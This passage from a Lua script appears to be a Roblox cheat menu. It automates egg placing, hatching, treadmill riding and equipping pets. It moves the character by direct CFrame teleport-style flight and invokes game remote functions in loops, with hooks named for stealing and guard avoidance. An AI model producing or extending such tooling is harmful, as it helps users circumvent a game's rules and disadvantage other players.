				local flag7 = type(v22) == "table" and type(v22.GetAssetEquipCapacity) == "function"
				local num = nil

				if flag7 then
					local ok, result2 = pcall(v22.GetAssetEquipCapacity, result and tonumber(result.BaseUpgradeLevel) or 0)
					num = ok and tonumber(result2) or nil
				end

				if not num then
					local rfPenRosterAskWearLimit = networking:FindFirstChild("RF/PenRoster/AskWearLimit")

					if rfPenRosterAskWearLimit and rfPenRosterAskWearLimit:IsA("RemoteFunction") then
						local ok, result2 = pcall(rfPenRosterAskWearLimit.InvokeServer, rfPenRosterAskWearLimit)
						num = ok and tonumber(result2) or nil
					end
				end

				local n26 = num or 0
				return n26 - n24 - n25, n26, n24, n25
			end

			local n24 = -0.5
			local n25 = -24

			local function fn47()
				local eggState = tbl.EggState
				local tbl24 = {}
				if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return tbl24
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return tbl24
				end

				for _, v22 in pairs(result) do
					local placement = type(v22) == "table" and v22.Placement or nil
					local localCFrame = type(placement) == "table" and placement.LocalCFrame or nil

					if typeof(localCFrame) == "CFrame" then
						table.insert(tbl24, Vector2.new(localCFrame.Position.X, localCFrame.Position.Z))
					end
				end

				return tbl24
			end

			local v22 = Random.new()

			local function fn48(arg)
				local tbl24 = {}

				for i = n25, 8, 4 do
					for i2 = 4, 30, 4 do
						local vector2 = Vector2.new(i, i2)
						local flag4 = true

						for _, v23 in ipairs(arg) do
							if (v23 - vector2).Magnitude < n16 then
								flag4 = false
								break
							end
						end

						if flag4 then
							table.insert(tbl24, CFrame.new(i, n24, i2))
						end
					end
				end

				for i = #tbl24, 2, -1 do
					local v23 = v22:NextInteger(1, i)
					local v24 = tbl24[i]
					tbl24[i] = tbl24[v23]
					tbl24[v23] = v24
				end

				return tbl24
			end

			local function fn49()
				local v23, v24, v25, v26 = fn46()
				local eggState = tbl.EggState
				local flag4 = type(eggState) == "table" and type(eggState.ReadOwnerEggs) == "function"
				local n26 = 0

				if flag4 then
					local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)

					if ok and type(result) == "table" then
						for _, v27 in pairs(result) do
							if type(v27) == "table" and v27.Placement == nil then
								n26 += 1
							end
						end
					end
				end

				str3 = string.format("Eggs placed %d/%d  -  %d/%d pets equipped, %d in bag", v25, 30, v26, v24, n26)
				return v23, v25
			end

			local function fn50(arg, arg2)
				local v23 = tbl4.Root()
				if not v23 then
					return false
				end
				local position = v23.Position
				local n26 = (arg - position).Magnitude / math.max(n5, 1) + 3
				local flag4 = nil
				local n27 = 0

				local connection2 = RunService.Heartbeat:Connect(function(deltaTime)
					if flag4 ~= nil or tbl4.AntiGuard.Busy then
						return
					end
					n27 += deltaTime
					local v24 = tbl4.Root()
					if not v24 or arg2() or n27 > n26 then
						flag4 = false
						return
					end

					if (v24.Position - position).Magnitude > 6 then
						position = v24.Position
					end

					local n28 = arg - position
					local n29 = n5 * deltaTime
					local flag5 = n28.Magnitude <= math.max(n29, 0.05)
					position = flag5 and arg or position + n28.Unit * n29
					local vector = Vector3.new(n28.X, 0, n28.Z)
					local cframe = vector.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, vector.Unit) or v24.CFrame.Rotation

					pcall(function()
						v24.CFrame = CFrame.new(position) * cframe
						v24.AssemblyLinearVelocity = Vector3.zero
						v24.AssemblyAngularVelocity = Vector3.zero
					end)

					if flag5 then
						flag4 = true
					end
				end)

				while flag4 == nil do
					RunService.Heartbeat:Wait()
				end

				connection2:Disconnect()
				return flag4
			end

			local function fn51()
				local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				local areas = world and world:FindFirstChild("Areas")
				areas = areas and areas:FindFirstChild("SeparationLine")
				return areas and areas:IsA("BasePart") and areas.Position.X or 552
			end

			local fn52 = nil

			local function fn53(arg)
				local v23 = tbl4.Root()
				if not v23 or type(tbl4.StealHome) ~= "function" then
					return nil
				end
				local v24 = fn51()
				if v23.Position.X < v24 == arg.X < v24 then
					return nil
				end
				local ok, result = pcall(tbl4.StealHome)
				if not ok or typeof(result) ~= "Vector3" then
					return nil
				end

				if (result - arg).Magnitude <= 12 or (v23.Position - result).Magnitude <= 12 then
					return nil
				end
				return result
			end

			fn52 = function(arg, arg2, arg3, arg4)
				local v23 = tbl4.Root()
				if not v23 then
					return false
				end

				if not arg4 then
					local v24 = fn53(arg)
					if v24 and not fn52(v24, arg2, arg3, true) then
						return false
					end

					if arg2 and arg2() then
						return false
					end
					v23 = tbl4.Root()
					if not v23 then
						return false
					end
				end

				tbl4.Shield(arg3 or "place", true)
				tbl4.Driving = tbl4.Driving + 1
				task.wait(0.2)
				local n26 = arg + Vector3.new(0, 3, 0)
				local n27 = math.max(v23.Position.Y, n26.Y) + n23

				local ok, result = pcall(function()
					return fn50(Vector3.new(v23.Position.X, n27, v23.Position.Z), arg2) and fn50(Vector3.new(n26.X, n27, n26.Z), arg2) and fn50(n26, arg2)
				end)

				ok = ok and result == true
				tbl4.Driving = math.max(0, tbl4.Driving - 1)
				tbl4.Shield(arg3 or "place", false)
				return ok
			end

			tbl4.FlyTo = function(arg, arg2, arg3)
				return fn52(arg, arg2, arg3 or "fly")
			end

			local function fn54()
				local eggState = tbl.EggState
				if type(eggState) ~= "table" or type(eggState.PlantEgg) ~= "function" then
					return false
				end
				local v23 = fn44()
				if not fn45(#v23) then
					return false
				end
				fn49()
				local v24, v25, v26 = fn46()
				local n26 = n20 - (tonumber(v26) or 0)
				if n26 <= 0 then
					return false
				end
				local v27 = tbl4.PenAnchor()
				if not v27 then
					return false
				end
				tbl4.Movement.PlaceWanted = true
				if not tbl4.ClaimMovement("place") then
					return "waiting"
				end
				local v28 = n22

				local function fn55()
					if v28 ~= n22 or not tbl4.Toggle(placeEggHandle, false) then
						return true
					end

					if tbl4.IsNight() then
						return false
					end
					return v19 == tbl19[4] or tbl4.Movement.StealFirst
				end

				if tbl4.Treadmill.Riding or tbl4.OnBelt() then
					tbl4.ExitBelt()
				end

				local function fn56()
					tbl4.HoldBelt()
					local ok, result = pcall(fn52, v27, fn55)
					tbl4.ReleaseBelt()
					return ok and result and true or false
				end

				if n15 < tbl4.DistanceTo(v27) then
					str3 = "Flying to the pen"

					if not fn56() then
						tbl4.LeaveBelt()
						n19 = os.clock() + n17
						return false
					end
				end

				tbl4.LeaveBelt()
				if fn55() then
					return false
				end

				local function fn57()
					if tbl4.DistanceTo(v27) <= n15 then
						return true
					end

					if fn55() then
						return false
					end
					str3 = "Pen out of reach, flying back"
					return fn56() and tbl4.DistanceTo(v27) <= n15
				end

				if not fn57() then
					str3 = "Could not reach the pen, trying again soon"
					n19 = os.clock() + n17
					return false
				end

				local v29 = fn47()
				local n27 = 0
				local n28 = 0

				for _, v30 in ipairs(v23) do
					if not (n27 >= n26 or fn55()) then
						if not fn57() then
							str3 = "Pen out of reach, stopping this pass"
							break
						else
							local ok, result = pcall(eggState.WearEggTool, v30.Uid)

							if ok and result ~= false then
								task.wait(0.15)
								local n29 = 0
								local flag4 = false

								for _, v31 in ipairs(fn48(v29)) do
									if not (fn55() or n29 >= n18) then
										n29 += 1
										local AskPlaceEgg, v32 = fn39("RF/EggWorld/AskPlaceEgg", { Uid = v30.Uid, LocalCFrame = v31 })

										if AskPlaceEgg and v32 ~= false then
											table.insert(v29, Vector2.new(v31.Position.X, v31.Position.Z))
											n27 += 1
											flag4 = true
											break
										else
											continue
										end
									end

									break
								end

								if flag4 then
									n28 = 0
									continue
								else
									tbl23[v30.Uid] = true
									n28 += 1
									if not (n28 >= 2) then
										continue
									end
								end
							else
								tbl23[v30.Uid] = true
								continue
							end
						end
					end

					break
				end

				if type(eggState.DoffEggTool) == "function" then
					pcall(eggState.DoffEggTool)
				end

				if n27 == 0 then
					n19 = os.clock() + n17
				end

				return n27 > 0
			end

			tbl3.Add(function()
				local v23, v24 = fn49()

				if placeEggStatusRow and type(placeEggStatusRow.Set) == "function" then
					pcall(placeEggStatusRow.Set, placeEggStatusRow, str3)
				end

				local num = tonumber(v24)
				local flag4 = num ~= nil and v21 ~= nil and num < v21

				if num then
					v21 = num
				end

				if flag4 then
					table.clear(tbl23)
				end

				if not tbl4.Toggle(placeEggHandle, false) then
					tbl4.Movement.PlaceWanted = false
					tbl4.ReleaseMovement("place")
					return false
				end

				if flag3 then
					return false
				end

				if os.clock() < n19 then
					tbl4.Movement.PlaceWanted = false
					return false
				end

				if tbl4.Movement.StealFirst and not tbl4.IsNight() then
					tbl4.Movement.PlaceWanted = false
					return false
				end
				flag3 = true

				task.spawn(function()
					local ok, result = pcall(fn54)

					if not (ok and result == "waiting") then
						tbl4.Movement.PlaceWanted = false
					end

					tbl4.ReleaseMovement("place")
					flag3 = false
					tbl3.Wake()
				end)

				return false
			end)

			placeEggHandle = tbl4.PlaceEggHandle
			placeEggStatusRow = tbl4.PlaceEggStatusRow

			tbl4.PlaceEggRestart = function()
				table.clear(tbl23)
				n22 += 1
				tbl4.StopWalking()
				tbl3.Wake()
			end

			tbl4.PlaceEggRefresh = function()
				table.clear(tbl23)
				tbl3.Wake()
			end

			tbl4.Rift.Restart.Place = function()
				table.clear(tbl23)
				tbl3.Wake()
			end
		end

		local save2 = tbl.Save

		if type(save2) == "table" and type(save2.FieldSignal) == "function" then
			for _, v21 in ipairs({ "EggInventory", "EquippedAssets", "BaseUpgradeLevel" }) do
				local ok, result = pcall(save2.FieldSignal, v21)

				if ok and type(result) == "table" and type(result.Connect) == "function" then
					local ok2, result2 = pcall(result.Connect, result, function()
						tbl3.Wake()
					end)

					if ok2 and result2 then
						fn4(function()
							pcall(function()
								result2:Disconnect()
							end)
						end)
					end
				end
			end
		end

		tbl4.Steal.HeldByMe = function()
			local carryUid = tbl4.Steal.CarryUid
			local character = localPlayer.Character
			if type(carryUid) ~= "string" or not character then
				return false
			end
			local v21 = workspace:FindFirstChild(carryUid)
			if not v21 then
				return false
			end

			for _, descendant in ipairs(v21:GetDescendants()) do
				if descendant:IsA("WeldConstraint") or descendant:IsA("JointInstance") then
					local ok, result, result2 = pcall(function()
						return descendant.Part0, descendant.Part1
					end)

					if ok and (result and result:IsDescendantOf(character) or result2 and result2:IsDescendantOf(character)) then
						return true
					end
				end
			end

			return false
		end

		do
			local n16 = 0

			local connection2 = RunService.Heartbeat:Connect(function(deltaTime)
				n16 += deltaTime
				if n16 < 0.2 then
					return
				end
				n16 = 0
				local steal = tbl4.Steal

				if not steal.Carrying then
					if steal.GuessedDrop then
						local ok, result = pcall(steal.HeldByMe)

						if ok and result then
							steal.GuessedDrop = false
							steal.Carrying = true
							steal.HeldSeenAt = os.clock()
						end
					end

					return
				end

				local ok, result = pcall(steal.HeldByMe)
				if not ok or result then
					steal.HeldSeenAt = os.clock()
					return
				end

				if os.clock() - (steal.HeldSeenAt or 0) > 0.8 then
					steal.Carrying = false
					steal.GuessedDrop = true
					steal.LastFinishedAt = os.clock()
					tbl3.Wake()
				end
			end)

			fn4(function()
				pcall(function()
					connection2:Disconnect()
				end)
			end)
		end

		do
			local eggState = tbl.EggState
			local carryChanged = type(eggState) == "table" and eggState.CarryChanged or nil

			if type(carryChanged) == "table" and type(carryChanged.Connect) == "function" then
				local ok, result = pcall(carryChanged.Connect, carryChanged, function(arg)
					local carrying = type(arg) == "table" and arg.IsCarrying == true

					if tbl4.Steal.Carrying and not carrying then
						tbl4.Steal.LastFinishedAt = os.clock()
					end

					tbl4.Steal.GuessedDrop = false

					if carrying then
						tbl4.Steal.HeldSeenAt = os.clock()
					end

					if carrying and type(arg.Uid) == "string" then
						tbl4.Steal.CarryUid = arg.Uid
						tbl4.Steal.CarryAreaId = arg.AreaId
						local mult = tonumber(arg.SpeedMultiplier)

						if mult and mult > 0 then
							tbl4.SafeCarry.Mult = mult
							tbl4.SafeCarry.Category = arg.AssetCategory

							if arg.AssetCategory ~= nil then
								local str3 = tostring(arg.AssetCategory)
								tbl4.SafeCarry.Seen[str3] = math.min(tbl4.SafeCarry.Seen[str3] or mult, mult)
							end
						end
					end

					tbl4.Steal.Carrying = carrying
					tbl3.Wake()
				end)

				if ok and result then
					fn4(function()
						pcall(function()
							result:Disconnect()
						end)
					end)
				end
			end
		end

		pcall(function()
			local reEggWorldFieldEggRedeemVerdict = networking:FindFirstChild("RE/EggWorld/FieldEggRedeemVerdict")
			local reAlertsRaise = networking:FindFirstChild("RE/Alerts/Raise")

			if reEggWorldFieldEggRedeemVerdict and reEggWorldFieldEggRedeemVerdict:IsA("RemoteEvent") then
				local connection2 = reEggWorldFieldEggRedeemVerdict.OnClientEvent:Connect(function()
					tbl4.SafeCarry.LastDelivered = os.clock()
				end)

				fn4(function()
					connection2:Disconnect()
				end)
			end

			if reAlertsRaise and reAlertsRaise:IsA("RemoteEvent") then
				local connection2 = reAlertsRaise.OnClientEvent:Connect(function(arg)
					if type(arg) == "table" and type(arg.Text) == "string" and string.find(arg.Text, "Delivery failed", 1, true) then
						tbl4.SafeCarry.LastFailed = os.clock()
					end
				end)

				fn4(function()
					connection2:Disconnect()
				end)
			end
		end)

		do
			local n16 = 10
			local n17 = 1
			local n18 = 5

			local function fn39(arg)
				local v21 = networking:FindFirstChild(arg)
				if not v21 or not v21:IsA("RemoteFunction") then
					return false, nil, nil
				end
				local ok, result, result2 = pcall(v21.InvokeServer, v21)
				return ok, result, result2
			end

			local n19 = 0
			local flag3 = false

			local function fn40(arg, arg2, arg3)
				if arg and arg2 ~= false then
					n19 = 0
					flag3 = false
					return true
				end

				if arg and tostring(arg3) == "Already using treadmill" then
					n19 = 0
					flag3 = false
					return true
				end

				if arg and tostring(arg3) == "Not grounded" and tbl4.Grounded() then
					n19 += 1

					if n19 >= 2 then
						n19 = 0

						if not flag3 then
							flag3 = true
							pcall(tbl4.UndoSwap)
						elseif type(tbl4.RequestRespawn) == "function" then
							flag3 = false
							tbl4.RequestRespawn()
						end
					end
				end

				return false
			end

			local v21 = nil
			local v22 = nil
			local flag4 = false
			local n20 = 0
			local flag5 = false
			local treadmill = tbl4.Treadmill

			local function fn41()
				return tbl4.Toggle(v21, false)
			end

			local function fn42()
				local movement = tbl4.Movement
				return movement.PlaceWanted or movement.ScrambleWanted or movement.MutationWanted or movement.FracturedWanted or movement.Owner ~= nil and movement.Owner ~= "treadmill" or tbl4.Steal.Active or tbl4.Steal.Carrying
			end

			local function fn43()
				local v23 = n20
				if fn42() or not tbl4.ClaimMovement("treadmill") then
					return false
				end

				local function fn44()
					return v23 ~= n20 or not fn41() or tbl4.Movement.Owner ~= "treadmill" or fn42()
				end

				if tbl4.BeltHeld() then
					tbl4.ResetBelt()
				end

				local v24 = tbl4.Belt()
				if not v24 then
					return false
				end
				local n21 = v24.Position + Vector3.new(0, v24.Size.Y / 2, 0)

				if tbl4.DistanceTo(n21 + Vector3.new(0, 2, 0)) > n16 then
					if type(tbl4.FlyTo) ~= "function" or not tbl4.FlyTo(n21, fn44, "treadmill") then
						return false
					end
				end

				if fn44() then
					return false
				end
				treadmill.Riding = fn40(fn39("RF/Treadmill/AskWearStill"))
				return treadmill.Riding
			end

			tbl3.Add(function()
				if not fn41() then
					if treadmill.Riding and not flag4 then
						flag4 = true

						task.spawn(function()
							pcall(tbl4.ExitBelt)
							flag4 = false
							tbl3.Wake()
						end)
					end

					return false
				end

				local v23 = flag4
				local v24

				if flag4 then
					v24 = v23
				else
					v24 = fn42()
				end

				if v24 then
					return false
				end

				if treadmill.Riding and tbl4.Toggle(v22, true) and tbl4.OnBelt() then
					if os.clock() >= (treadmill.NextCheck or 0) and not tbl4.Flying and tbl4.Grounded() then
						treadmill.NextCheck = os.clock() + n18
						flag4 = true

						task.spawn(function()
							local ok, result = pcall(function()
								return fn40(fn39("RF/Treadmill/AskWearStill"))
							end)

							treadmill.Riding = ok and result == true

							if not treadmill.Riding then
								treadmill.NextTry = 0
							end

							flag4 = false
							tbl3.Wake()
						end)
					end

					return false
				end

				if os.clock() < (treadmill.NextTry or 0) then
					return false
				end
				treadmill.NextCheck = 0
				treadmill.NextTry = os.clock() + (treadmill.LastFailed and 3 or 4)
				flag4 = true

				task.spawn(function()
					local ok, result = pcall(fn43)
					treadmill.LastFailed = not (ok and result == true)
					tbl4.ReleaseMovement("treadmill")
					flag4 = false
					tbl3.Wake()
				end)

				return false
			end)

			task.spawn(function()
				while not flag5 do
					task.wait(3)

					if not fn41() and not fn42() and not tbl4.Flying and tbl4.OnBelt() and tbl4.Grounded() then
						fn40(fn39("RF/Treadmill/AskWearStill"))
					end
				end
			end)

			task.spawn(function()
				local n21 = 0

				while not flag5 do
					local v23 = task.wait(0.25)

					if not fn41() or not treadmill.Riding or fn42() then
						n21 = 0
					elseif tbl4.OnBelt() then
						n21 = 0
					else
						n21 += v23

						if n21 >= 1.5 then
							treadmill.Riding = false
							treadmill.NextTry = 0
							tbl3.Wake()
							n21 = 0
						end
					end
				end
			end)

			task.spawn(function()
				local n21 = 0
				local n22 = 0
				local position = nil

				while not flag5 do
					local v23 = task.wait(0.25)
					n21 = math.max(0, n21 - v23)
					local flag6 = treadmill.Riding and fn41() and not fn42()
					local v24 = tbl4.Root()
					local character = localPlayer.Character
					character = character and character:FindFirstChildOfClass("Humanoid")

					if flag6 or not (tbl4.Flying or tbl4.Movement.Owner ~= nil or tbl4.Movement.PlaceWanted or character ~= nil and character.MoveDirection.Magnitude > 0.1) or not v24 or not tbl4.OnBelt() then
						position = v24 and v24.Position
						n22 = 0
						position = position or nil
					else
						local vector = Vector3.new(v24.Position.X, 0, v24.Position.Z)
						position = position and (vector - Vector3.new(position.X, 0, position.Z)).Magnitude < 0.5

						if position then
							n22 += v23
						else
							n22 = 0
						end

						position = v24.Position

						if n22 >= n17 and n21 <= 0 then
							pcall(tbl4.ExitBelt)
							n21 = 1.5
							n22 = 0
						end
					end
				end
			end)

			fn4(function()
				flag5 = true
				treadmill.Riding = false
			end)

			v21 = v10:CreateToggle({
				Name = "Auto Treadmill",
				Default = false,
				Callback = function()
					n20 += 1
					tbl4.StopWalking()
					tbl3.Wake()
				end,
			})

			v22 = v10:CreateToggle({ Name = "Stay On Treadmill", Default = true })
		end

		do
			local n16 = 4
			local n17 = 10
			local v21 = nil
			local flag3 = false
			local n18 = 0
			local tbl23 = {}
			local tbl24 = { MinRarity = 0, MinIncome = 0, Eggs = {} }

			local function fn39(arg, arg2)
				local v22 = networking:FindFirstChild(arg)
				if not v22 or not v22:IsA("RemoteFunction") then
					return false, nil
				end
				return pcall(v22.InvokeServer, v22, arg2)
			end

			local function fn40(arg)
				local flag4 = tbl24.MinRarity > 0
				local flag5

				if flag4 then
					local minRarity = tbl24.MinRarity
					flag5 = tbl4.EggRarity(arg) < minRarity
				else
					flag5 = flag4
				end

				if flag5 then
					return false
				end
				local flag6 = tbl24.MinIncome > 0

				if flag6 then
					local minIncome = tbl24.MinIncome
					flag6 = tbl4.EggIncome(arg) < minIncome
				end

				if flag6 then
					return false
				end

				if next(tbl24.Eggs) ~= nil and tbl24.Eggs[tostring(arg.AssetCategory)] ~= true then
					return false
				end
				return true
			end

			local function fn41()
				local eggState = tbl.EggState
				if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return {}
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return {}
				end
				local flag4 = tbl4.Toggle(v21, false) == true
				local Hatch = tbl4.RiftOn("Hatch") and tbl4.RiftShortfall() or {}
				local tbl25 = {}
				local tbl26 = {}

				for k, v22 in pairs(result) do
					local flag5 = type(v22) == "table" and v22.Placement ~= nil
					local flag6

					if flag5 then
						flag6 = (tbl23[k] or 0) <= os.clock()
					else
						flag6 = flag5
					end

					if flag6 then
						local ok2, result2 = pcall(eggState.IsReadyToHatch, k)

						if ok2 and result2 == true then
							local str3 = tostring(v22.AssetCategory)

							if (Hatch[str3] or 0) > 0 then
								Hatch[str3] = Hatch[str3] - 1
								table.insert(tbl25, k)
							elseif flag4 and fn40(v22) then
								table.insert(tbl26, k)
							end
						end
					end
				end

				for _, v22 in ipairs(tbl26) do
					table.insert(tbl25, v22)
				end

				return tbl25
			end

			local function fn42()
				return tbl4.Toggle(v21, false) or tbl4.RiftOn("Hatch")
			end

			local function fn43()
				local v22 = n18
				local v23 = fn41()
				local n19 = 0

				for _, v24 in ipairs(v23) do
					if not (n19 >= n16 or v22 ~= n18 or not fn42()) then
						local AskHatch, v25 = fn39("RF/EggWorld/AskHatch", v24)

						if AskHatch and v25 ~= false then
							task.wait(0.35)
							fn39("RF/EggWorld/AskFinishHatch", v24)
							n19 += 1
							tbl23[v24] = nil
						else
							tbl23[v24] = os.clock() + n17
						end

						task.wait(0.2)
						continue
					end

					break
				end

				return n19 > 0
			end

			tbl3.Add(function()
				if not fn42() or flag3 then
					return false
				end
				flag3 = true

				task.spawn(function()
					pcall(fn43)
					flag3 = false
				end)

				return false
			end)

			local function hatch()
				n18 += 1
				table.clear(tbl23)
				tbl3.Wake()
			end

			v21 = v11:CreateToggle({ Name = "Auto Hatch", Default = false, Callback = hatch })

			v11:CreateDropdown({
				Name = "Hatch Min Rarity",
				Note = "Hatch eggs of the chosen rarity and every rarity above it",
				Options = tbl8,
				Default = tbl8[1],
				SubOf = v21,
				Callback = function(arg)
					tbl24.MinRarity = tbl9[arg] or 0
					hatch()
				end,
			})

			local tbl25 = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}

			local tbl26 = { Slider = nil, Value = 0, Unit = "M/s" }

			local function fn44(arg, arg2)
				if arg ~= nil then
					tbl26.Value = math.max(0, math.floor(tonumber(arg) or tbl26.Value))
				end

				if arg2 ~= nil then
					tbl26.Unit = tostring(arg2)
				end

				tbl24.MinIncome = tbl26.Value * (tbl25[tbl26.Unit] or tbl25["M/s"]).Mult
				hatch()
			end

			tbl26.Slider = fn5(v11, {
				Name = "Min Hatch Value",
				Note = "Skip eggs worth less than this (0 = off)",
				SubOf = v21,
				Legacy = "Hatch Min Value",
				SectionName = "Auto Hatch & Equip",
				OnRaw = function(arg)
					fn44(math.floor(arg / 1000), "K/s")
				end,
			})

			local tbl27 = {}
			local tbl28 = {}
			local directory = tbl.Assets and tbl.Assets.Directory
			local n19 = 0

			while (type(directory) ~= "table" or next(directory) == nil) and n19 < 2 do
				n19 += task.wait(0.1)

				if type(tbl.Assets) ~= "table" then
					tbl.Assets = fn2(function()
						return ReplicatedStorage.Data.Assets
					end)
				end

				directory = tbl.Assets and tbl.Assets.Directory
			end

			local tbl29 = {}

			if type(directory) == "table" then
				for k, v22 in pairs(directory) do
					local rarity = type(v22) == "table" and v22.Rarity or nil
					local flag4 = type(rarity) == "table"

					if flag4 then
						flag4 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					local v23 = flag4 or nil

					if v23 then
						table.insert(tbl29, {
							Category = tostring(k),
							Name = tostring(v22.DisplayName or k),
							Rarity = v23,
							RarityName = tostring(rarity.DisplayName or rarity._id or v23),
						})
					end
				end
			end

			table.sort(tbl29, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity > arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v22 in ipairs(tbl29) do
				local str3 = string.format("%s [%s]", v22.Name, v22.RarityName)

				if tbl28[str3] then
					str3 = string.format("%s [%s] (%s)", v22.Name, v22.RarityName, v22.Category)
				end

				table.insert(tbl27, str3)
				tbl28[str3] = v22.Category
			end

			if #tbl27 > 0 then
				fn6(v11:CreateMultiDropdown({
					Name = "Hatch Specific Eggs",
					Note = "Only hatch these eggs (empty = all)",
					Options = tbl27,
					Default = {},
					SubOf = v21,
					Callback = function(arg)
						local eggs = {}

						if type(arg) == "table" then
							for k, v22 in pairs(arg) do
								k = v22 == true and type(k) == "string" and k

								if k then
									v22 = k
								else
									v22 = type(v22) == "string" and v22
								end

								local v23 = v22 or nil

								if v23 and tbl28[v23] then
									eggs[tbl28[v23]] = true
								end
							end
						end

						tbl24.Eggs = eggs
						hatch()
					end,
				}))
			end

			tbl4.Rift.Restart.Hatch = hatch
		end

		do
			local n16 = 5
			local n17 = 30
			local v21 = nil
			local flag3 = false
			local n18 = 0
			local tbl23 = {}
			local n19 = 0
			local flag4 = true
			local v22 = nil
			local n20 = -math.huge

			local function fn39(arg)
				local v23 = fn2(function()
					return ReplicatedStorage.Data.Bases
				end)

				if type(v23) == "table" and type(v23.GetAssetEquipCapacity) == "function" then
					local ok, result = pcall(v23.GetAssetEquipCapacity, arg and tonumber(arg.BaseUpgradeLevel) or 0)
					if ok and tonumber(result) then
						return math.floor(tonumber(result))
					end
				end

				if v22 and os.clock() - n20 < n17 then
					return v22
				end
				local rfPenRosterAskWearLimit = networking:FindFirstChild("RF/PenRoster/AskWearLimit")

				if rfPenRosterAskWearLimit and rfPenRosterAskWearLimit:IsA("RemoteFunction") then
					local ok, result = pcall(rfPenRosterAskWearLimit.InvokeServer, rfPenRosterAskWearLimit)

					if ok and tonumber(result) then
						local n21 = math.floor(tonumber(result))
						local now = os.clock()
						v22 = n21
						n20 = now
						return v22
					end
				end

				return v22 or 0
			end

			local function fn40(arg)
				local directory = tbl.Assets and tbl.Assets.Directory
				local flag5 = type(directory) == "table" and directory[tostring(arg.Category)] or nil
				local n21 = type(flag5) == "table" and tonumber(flag5.EarningRate) or 0
				local n22 = tonumber(arg.Scale) or 0
				if n21 <= 0 or n22 <= 0 then
					return 0
				end
				local n23 = n22 > 5 and (n22 / 5) ^ 1.2 * 19.637875755794113 or n22 ^ 1.85
				local mutations = tbl.Mutations
				local flag6 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n24 = 1

				if flag6 then
					local ok
					ok, n24 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
					local flag7 = ok and type(n24) == "number"
					local n25 = 1

					if not flag7 then
						n24 = n25
					end
				end

				return n21 * n23 * n24
			end

			local function fn41()
				local save3 = tbl.Save
				local flag5 = type(save3) == "table" and type(save3.Get) == "function"
				local result = nil

				if flag5 then
					local ok
					ok, result = pcall(save3.Get)
					result = ok and type(result) == "table" and result or nil
				end

				if not result then
					return nil
				end
				local tbl24 = {}
				local tbl25 = {}
				local v23 = pairs
				local equippedAssets = result.EquippedAssets or {}

				for _, equippedAsset in v23(equippedAssets) do
					if type(equippedAsset) == "string" then
						tbl24[equippedAsset] = true
						table.insert(tbl25, equippedAsset)
					end
				end

				local tbl26 = {}
				local v24 = pairs
				local inventory = result.Inventory or {}

				for k, v25 in v24(inventory) do
					if type(v25) == "table" and v25.InFuse ~= true then
						table.insert(tbl26, { Uid = k, Income = fn40(v25), Equipped = tbl24[k] == true })
					end
				end

				table.sort(tbl26, function(arg, arg2)
					if arg.Income ~= arg2.Income then
						return arg.Income > arg2.Income
					end
					return tostring(arg.Uid) < tostring(arg2.Uid)
				end)

				return tbl26, tbl24, #tbl25, result
			end

			local function fn42(arg, arg2)
				local tbl24 = {}
				local flag5 = false

				for i, v23 in ipairs(arg) do
					if not (arg2 < i) then
						if not v23.Equipped then
							table.insert(tbl24, v23.Uid)

							if not tbl23[v23.Uid] then
								flag5 = true
							end
						end

						continue
					end

					break
				end

				return tbl24, flag5
			end

			tbl3.Add(function()
				if not tbl4.Toggle(v21, false) then
					return false
				end
				local v23, v24, v25, v26 = fn41()

				if v23 then
					local v27 = fn39(v26)
					local v28, v29 = fn42(v23, v27)

					if (v29 or flag4) and not flag3 and os.clock() >= n19 then
						for _, v30 in ipairs(v28) do
							tbl23[v30] = true
						end

						flag4 = false
						flag3 = true
						n19 = os.clock() + n16
						local v30 = n18

						task.spawn(function()
							local rfHaulFetchWearBestStatus = networking:FindFirstChild("RF/Haul/FetchWearBestStatus")
							local isRemoteFunction = rfHaulFetchWearBestStatus and rfHaulFetchWearBestStatus:IsA("RemoteFunction")
							local flag5 = true

							if isRemoteFunction then
								local ok, result = pcall(rfHaulFetchWearBestStatus.InvokeServer, rfHaulFetchWearBestStatus)
								flag5 = ok and result ~= false and result ~= nil
							end

							local rfHaulWearBest = networking:FindFirstChild("RF/Haul/WearBest")

							if flag5 and v30 == n18 and rfHaulWearBest and rfHaulWearBest:IsA("RemoteFunction") then
								pcall(rfHaulWearBest.InvokeServer, rfHaulWearBest)
							end

							flag3 = false
							tbl3.Wake()
						end)
					end
				end

				return false
			end)

			v21 = v11:CreateToggle({
				Name = "Auto Equip Best",
				Note = "Equip Best when a better pet appears",
				Default = false,
				Callback = function()
					n18 += 1
					table.clear(tbl23)
					n19 = 0
					flag4 = true
					tbl3.Wake()
				end,
			})

			local save3 = tbl.Save

			if type(save3) == "table" and type(save3.FieldSignal) == "function" then
				for _, v23 in ipairs({ "Inventory", "EquippedAssets" }) do
					local ok, result = pcall(save3.FieldSignal, v23)

					if ok and type(result) == "table" and type(result.Connect) == "function" then
						local ok2, result2 = pcall(result.Connect, result, function()
							flag4 = true
							tbl3.Wake()
						end)

						if ok2 and result2 then
							fn4(function()
								pcall(function()
									result2:Disconnect()
								end)
							end)
						end
					end
				end
			end
		end

		local n16
		n16 = 3
		local n17
		n17 = 50
		local tbl23
		tbl23 = { "Rarity Only", "Value Only", "Rarity And Value", "Rarity Or Value" }
		local tbl24, tbl25, tbl26, tbl27, fn39, v21

		do
			local v22 = fn2(function()
				return ReplicatedStorage.Shared.Util.AssetItems
			end)

			tbl24 = {}
			tbl25 = {}
			tbl26 = {}
			tbl27 = {}
			local directory = tbl.Assets and tbl.Assets.Directory
			local tbl28 = {}
			local tbl29 = {}

			if type(directory) == "table" then
